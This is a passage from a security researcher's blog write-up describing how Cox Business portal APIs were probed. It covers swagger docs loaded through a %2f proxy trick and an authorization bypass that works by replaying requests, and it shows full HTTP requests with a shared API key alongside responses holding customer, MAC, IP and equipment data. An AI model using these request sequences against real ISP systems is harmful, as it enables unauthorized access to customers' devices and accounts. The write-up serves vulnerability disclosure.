<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.</p>
<p>Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.</p>
<p>The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.</p>
<h2 id="targeting-rest-apis-using-the-tr-069-protocol">Targeting REST APIs using the TR-069 Protocol</h2>
<p>After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.</p>
<p>The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I'd likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.</p>
<h2 id="hacking-millions-of-modems">Hacking Millions of Modems</h2>
<p>The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the <code>main.36624ed36fb0ff5b.js</code> file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:</p>
<pre><code>/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
/api/cbma/user/identity/services/useridentity/user/contact/validate
...
</code></pre>
<p>There were over 100 different API calls that all had the same base path of <code>/api/cbma/</code>. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the <code>/api/cbma/</code> endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:</p>
<h3 id="http-request-that-does-not-start-with-apicbma-returns-301">HTTP request that does not start with api/cbma (returns 301):</h3>
<pre><code><span>GET</span> <span>/api/anything_else/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>301</span> <span>Moved</span> <span>Permanently</span>
<span>Location:</span> <span>https://myaccount-business.cox.com/cbma/api/anything_else/example</span>
</code></pre>
<h3 id="http-request-that-does-start-with-apicbma-returns-500">HTTP request that does start with api/cbma (returns 500):</h3>
<pre><code><span>GET</span> <span>/api/cbma/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>From sending the above HTTP requests, we learn that the <code>api/cbma</code> endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides <code>api/cbma</code>, it responds with a 302 redirect instead of the 500 internal server error triggered from <code>api/cbma</code>.</p>
<p>This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.</p>
<p>Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the <code>api/cbma</code> route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.</p>
<p>I went ahead and proxied the registration request for the Cox Business portal which was underneath the <code>api/cbma</code> path:</p>
<pre><code><span>POST</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:124.0)</span> <span>Gecko/20100101</span> <span>Firefox/124.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4</span>
<span>Content-Length:</span> <span>28</span>
<span>Connection:</span> <span>close</span>

{<span>"email"</span><span>:"test@example.com"</span>}
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>126</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"id":</span> <span>"test@example.com"</span>
}
</code></pre>
<p>The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The <code>clientid</code> and <code>Cb_session</code> keys looked very custom and indicated there were multiple roles and permissions used in the application.</p>
<p>The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"timestamp":</span> <span>"2024-04-12T08:57:14.384+00:00"</span>,
  <span>"status":</span> <span>500</span>,
  <span>"error":</span> <span>"Internal Server Error"</span>,
  <span>"path":</span> <span>"/services/profile/validate/v1/email"</span>
}
</code></pre>
<p>Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.</p>
<p>I went ahead and tried to guess the actuator route:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/actuator/</span>
</code></pre>
<p>Shame, no easy actuators. I then checked for accessible API documentation:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/index.html</span>
<span>✅</span> <span>GET</span> <span>/api/cbma/userauthorization/swagger-ui/index.html</span>
</code></pre>
<p>We had a hit! There was a swagger landing page at <code>/api/cbma/profile/swagger-ui/index.html</code>. I loaded the page expecting to see API routes, however...</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:</p>
<pre><code><span>GET</span> <span>/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
<span>...</span>
<span>GET</span> <span>/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
</code></pre>
<p>It seemed that requests to load static resources for the page (<code>.png</code>, <code>.js</code>, <code>.css</code>) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>After confirming that the <code>.js</code> extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.</p>
<h3 id="loading-static-resources-from-reverse-proxy-api">Loading Static Resources from Reverse Proxy API</h3>
<p>To fuzz this, I simply used Burp’s intruder to enumerate from <code>%00</code> to <code>%FF</code> at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded <code>/</code> symbol:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP</span>/<span>2</span> <span>200</span> <span>OK</span>
<span>Content</span>-<span>Type</span>: application/javascript

<span>window</span>.<span>onload</span> = <span>function</span>(<span></span>) { <span>window</span>.<span>ui</span> = <span>SwaggerUIBundle</span>({ <span>url</span>: <span>"https://petstore.swagger.io/v2/swagger.json"</span>, <span>dom_id</span>: <span>'#swagger-ui'</span>, <span>deepLinking</span>: <span>true</span>, <span>presets</span>: [ <span>SwaggerUIBundle</span>.<span>presets</span>.<span>apis</span>, <span>SwaggerUIStandalonePreset</span> ], <span>plugins</span>: [ <span>SwaggerUIBundle</span>.<span>plugins</span>.<span>DownloadUrl</span> ], <span>layout</span>: <span>"StandaloneLayout"</span> , <span>"configUrl"</span> : <span>"/services/v3/api-docs/swagger-config"</span>, <span>"validatorUrl"</span> : <span>""</span> }); <span>//&lt;/editor-fold&gt; };</span>
</code></pre>
<p>By appending the <code>%2f</code> to the <code>.js</code> extension, we could load the JS files. I wrote a rule to append <code>%2f</code> to all static resources using Burp’s match-and-replace then reloaded the page.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:</p>
<pre><code>account (115 routes)
voiceutilities (73 routes)
user (70 routes)
datainternetgateway (57 routes)
accountequipment (55 routes)
billing (53 routes)
ticket (52 routes)
profile (47 routes)
voicecallmanagement (46 routes)
voicemail (37 routes)
voiceusermanagement (30 routes)
userauthorization (24 routes)
csr (16 routes)
voiceprofile (14 routes)
</code></pre>
<p>After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:</p>
<pre><code>accountequipment (55 routes)
datainternetgateway (57 routes)
account (115 routes)
</code></pre>
<p>Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.</p>

<p>After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following "profilesearch" endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:</p>
<pre><code><span>GET</span> <span>/api/cbma/profile/services/profile/profilesearch/</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"profile":</span> {
    <span>"numberofRecords":</span> <span>"0 hits"</span>,
    <span>"searchList":</span> []
  }
}
</code></pre>
<p>From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in <code>test</code> into the URI and got the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Authorization Error-Invalid User Token"</span>
<span>}</span>
</code></pre>
<p>Invalid user token? But I’d just been able to hit this endpoint? I removed the word <code>test</code> from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.</p>
<p>I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.</p>
<p>To test if I could reproduce this with an actual search query, I wrote down <code>cox</code> in the URI and replayed the request 2-3 more times until I saw the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>
  <span>"profile"</span><span>:</span> <span>{</span>
    <span>"numberofRecords"</span><span>:</span> <span>"10000+ hits"</span><span>,</span>
    <span>"searchList"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"COX REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"cbbccdae-b1ab-4e8c-9cec-e20c425205a1"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"Cox Communications SIP Trunk REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"bc2a49c7-0c3f-4cab-9133-de7993cb1c7d"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"cox test account ds1/REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"74551032-e703-46a2-a252-dc75d6daeedc"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word "cox" with "fbi" to see if it was actually pulling customer data:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>
  <span>"profile"</span><span>:</span> <span>{</span>
    <span>"numberofRecords"</span><span>:</span> <span>"REDACTED hits"</span><span>,</span>
    <span>"searchList"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"7b9f092a-e938-41d5-bcf5-0be1bb6487f5"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"c8923f6f-b4ed-4f66-a743-000a961edb35"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"a32b8112-48ac-4a4f-8893-5ca1c392a31d"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!</p>
<p>We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.</p>
<h3 id="confirming-we-can-access-anyones-equipment">Confirming We Can Access Anyone's Equipment</h3>
<p>I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could've been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.</p>
<p>I went ahead and pulled out the simplest looking request that took in a <code>macAddress</code> parameter to test if I could access my own modem via the API.</p>
<pre><code>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac
</code></pre>
<p>This was a GET request to retrieve a modem IP address that required a <code>macAddress</code> parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"ipv4":</span> <span>"98.165.155.8"</span>
}
</code></pre>
<p>It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone's device.</p>
<p>The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone's account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the <code>accountequipment/services/accountequipment/v1/equipments</code> endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"accountEquipmentList":</span> [
    {
      <span>"equipmentCategory":</span> <span>"Internet"</span>,
      <span>"equipmentModelMake":</span> <span>"NOKIA G-010G-A"</span>,
      <span>"equipmentName":</span> <span>"NOKIA G-010G-A"</span>,
      <span>"equipmentType":</span> <span>"Nokia ONT"</span>,
      <span>"itemModelMake":</span> <span>"NOKIA"</span>,
      <span>"itemModelNumber":</span> <span>"G-010G-A"</span>,
      <span>"itemNumber":</span> <span>"DAL10GB"</span>,
      <span>"macAddress":</span> <span>"f8:0c:58:bb:cb:92"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"F80C58BBCB92"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"ONT_ALU"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20220121"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Data"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"ALCLEB313C84"</span>
    },
    {
      <span>"equipmentCategory":</span> <span>"Voice"</span>,
      <span>"equipmentModelMake":</span> <span>"CISCO DPQ3212"</span>,
      <span>"equipmentName":</span> <span>"CISCO DPQ3212"</span>,
      <span>"equipmentType":</span> <span>"Cable Modem"</span>,
      <span>"itemModelMake":</span> <span>"CISCO"</span>,
      <span>"itemModelNumber":</span> <span>"DPQ3212"</span>,
      <span>"itemNumber":</span> <span>"DSA321N"</span>,
      <span>"macAddress":</span> <span>"e4:48:c7:0d:9a:71"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"E448C70D9A71"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"DATA_D3"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20111229"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Unknown"</span>
        },
        {
          <span>"address":</span> <span>"E448C70D9A75"</span>,
          <span>"portNumber":</span> <span>"2"</span>,
          <span>"portType":</span> <span>"TELEPHONY"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20111229"</span>,
          <span>"serviceCategoryCode":</span> <span>"T"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Telephone"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"240880144"</span>
    },
    {
      <span>"equipmentCategory":</span> <span>"Television"</span>,
      <span>"equipmentModelMake":</span> <span>"Cox Business TV (Contour 1)"</span>,
      <span>"equipmentName":</span> <span>"Cox Business TV (Contour 1)"</span>,
      <span>"equipmentType":</span> <span>"Cable Receiver"</span>,
      <span>"itemModelMake":</span> <span>"CISCO"</span>,
      <span>"itemModelNumber":</span> <span>"650"</span>,
      <span>"itemNumber":</span> <span>"GSX9865"</span>,
      <span>"macAddress":</span> <span>"50:39:55:da:93:05"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"44E08EBB6DBC"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"CHDDVRX1"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20131108"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Cable"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"SACDRVKQN"</span>
    }
  ]
}
</code></pre>
<p>It worked! My connected equipment was returned in the HTTP response.</p>
<h3 id="accessing-and-updating-any-cox-business-customer-account">Accessing and Updating any Cox Business Customer Account</h3>
<p>To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response:</p>
<pre><code><span>GET</span> <span>/api/cbma/user/services/user/admin@cox.net</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"id":</span> <span>"admin@cox.net"</span>,
  <span>"guid":</span> <span>"89d6db21-402d-4a57-a87b-cad85d01b192"</span>,
  <span>"email":</span> <span>"admin@cox.net"</span>,
  <span>"firstName":</span> <span>"Redacted"</span>,
  <span>"lastName":</span> <span>"Redacted"</span>,
  <span>"primaryPhone":</span> <span>"Redacted"</span>,
  <span>"status":</span> <span>"INACTIVE"</span>,
  <span>"type":</span> <span>"RETAIL"</span>,
  <span>"profileAdmin":</span> <span>true</span>,
  <span>"profileOwner":</span> <span>true</span>,
  <span>"isCpniSetupRequired":</span> <span>false</span>,
  <span>"isPasswordChangeRequired":</span> <span>true</span>,
  <span>"timeZone":</span> <span>"EST"</span>,
  <span>"userType":</span> <span>"PROFILE_OWNER"</span>,
  <span>"userProfileDetails":</span> {
    <span>"id":</span> <span>"{3DES}JA1+doxmDYc="</span>,
    <span>"guid":</span> <span>"9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da"</span>,
    <span>"name":</span> <span>"Supreme Carpet Care"</span>,
